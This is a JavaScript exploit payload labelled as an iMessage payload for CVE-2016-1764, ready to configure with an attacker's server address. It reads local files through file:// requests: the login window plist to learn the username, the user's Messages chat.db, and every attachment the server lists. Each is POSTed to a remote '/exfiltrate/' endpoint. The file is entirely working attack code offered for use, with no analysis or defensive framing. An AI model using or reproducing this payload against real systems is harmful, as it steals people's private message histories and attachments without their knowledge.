/*
 * iMessage Payload for CVE-2016-1764
 */

var exfil_server = "http://yourhostname:8888";

// Don't edit below this line
var username = "";
function offload_to_server( data_buffer, path, callback ) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            callback( xhr.responseText );
        }
    }
    var uri_path = exfil_server + "/" + path
    xhr.open( 'POST', uri_path, true );
    xhr.send( data_buffer );
}

function get_username( callback ) {
    var populate_xhr = new XMLHttpRequest();
    populate_xhr.responseType = "arraybuffer";
    populate_xhr.onreadystatechange = function() {
        if (populate_xhr.readyState == XMLHttpRequest.DONE) {
            offload_to_server( populate_xhr.response, 'plist', function( username ) {
                callback( username );
            });
        }
    }
    populate_xhr.open('GET', 'file:///Library/Preferences/com.apple.loginwindow.plist', true);
    populate_xhr.send(null);
}

function exfiltrate_file( filename, file_path ) {
    var xhr = new XMLHttpRequest();
    xhr.responseType = "arraybuffer";
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            send_to_server( xhr.response, filename );
        }
    }
    var uri_path = 'file:///Users/' + username + '/' + encodeURI( file_path );
    xhr.open('GET', uri_path, true);
    xhr.send(null);
}

function send_to_server(db_array_buffer, filename) {
    console.log( filename );
    var exfil_xhr = new XMLHttpRequest();
    exfil_xhr.onreadystatechange = function() {
        if (exfil_xhr.readyState == XMLHttpRequest.DONE) {
            callback( exfil_xhr.responseText );
        }
    }
    var uri_path = exfil_server + "/exfiltrate/" + username + "/" + filename + "/"
    exfil_xhr.open('POST', uri_path, true);
    exfil_xhr.send( db_array_buffer );
}

function upload_chatdb() {
    var xhr = new XMLHttpRequest();
    xhr.responseType = "arraybuffer";
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            offload_to_server( xhr.response, 'exfiltrate/' + username + '/chat.db/', function( attachment_list_json ){
                var attachment_list = JSON.parse( attachment_list_json );
                for( var i = 0; i < attachment_list.length; i++ ) {
                    var file_parts = attachment_list[i].split( "/" );
                    exfiltrate_file( file_parts[ file_parts.length - 1 ], attachment_list[i] );
                }
            });
        }
    }
    var uri_path = 'file:///Users/' + username + '/Library/Messages/chat.db';
    xhr.open('GET', uri_path, true);
    xhr.send(null);
}

get_username( function( in_username ) {
    username = in_username;
    upload_chatdb();
});
